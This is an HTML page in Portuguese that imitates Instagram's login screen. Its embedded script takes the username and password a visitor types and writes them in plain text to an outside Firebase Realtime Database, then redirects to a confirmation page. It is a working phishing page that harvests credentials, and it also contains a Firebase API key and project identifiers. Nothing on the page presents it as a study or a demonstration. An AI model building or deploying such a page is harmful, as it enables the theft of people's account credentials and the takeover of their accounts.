<!doctype html>
<html lang="pt-br">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Login Instagram</title>
    <link rel="stylesheet" href="./login_insta.css" />
  </head>
  <body>
    <main class="container">
      <header class="language-selector">
        <span>Português (Brasil)</span>
      </header>

      <div class="login-wrapper">
        <img src="assets/i_logo.png" alt="Logotipo do Instagram" class="logo" />

        <form id="login-form" class="login-form" onsubmit="handleLogin(event)">
          <input
            id="username"
            type="text"
            placeholder="Nome de usuário, email ou celular"
            aria-label="Nome de usuário, email ou celular"
            required
          />
          <input
            id="password"
            type="password"
            placeholder="Senha"
            aria-label="Senha"
            required
          />
          <button type="submit" class="btn-primary">Entrar</button>
        </form>

        <a href="#" class="forgot-password">Esqueceu a senha?</a>
      </div>

      <footer class="footer-actions">
        <button type="button" class="btn-secondary">Criar nova conta</button>
        <div class="meta-logo"><span class="meta-icon">∞</span> Meta</div>
      </footer>
    </main>

    <script type="module">
      // 1. Importações corretas para o Realtime Database
      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
      import {
        getDatabase,
        ref,
        push,
        set,
      } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";

      // Your web app's Firebase configuration
      const firebaseConfig = {
        apiKey: "AIzaSyBFeQqcTkNN5Am5q8MqJFNMPV1zqc_fRng",
        authDomain: "teste-1e772.firebaseapp.com",
        databaseURL: "https://teste-1e772-default-rtdb.firebaseio.com",
        projectId: "teste-1e772",
        storageBucket: "teste-1e772.firebasestorage.app",
        messagingSenderId: "463224912159",
        appId: "1:463224912159:web:3df0f21b630be833a9982a",
      };

      const app = initializeApp(firebaseConfig);
      const db = getDatabase(app);

      async function handleLogin(event) {
        event.preventDefault();
        const name = document.getElementById("username").value;
        const password = document.getElementById("password").value;

        console.log(name, "\n", password);

        try {
          // Cria uma referência para o nó "usuarios_teste" no Realtime Database
          const usersRef = ref(db, "usuarios_teste");

          // 'push()' gera um ID único automático para o novo registro
          const newUserRef = push(usersRef);

          // 'set()' salva os dados dentro do ID gerado
          await set(newUserRef, {
            usuario: name,
            senha: password,
            dataRegistro: new Date().toISOString(),
          });

          console.log("Dados enviados com sucesso para o Realtime Database.");
          loginForm.reset();
          location.href = "./confirmação_lnstagram.html"; // Redireciona para a página de agradecimento
        } catch (error) {
          console.error("Falha ao enviar os dados: ", error);
        }
      }
      // 4. Captura do formulário via ID e interceptação do evento submit
      const loginForm = document.getElementById("login-form");
      loginForm.addEventListener("submit", async (event) => {
        handleLogin(event);
      });
    </script>
  </body>
</html>
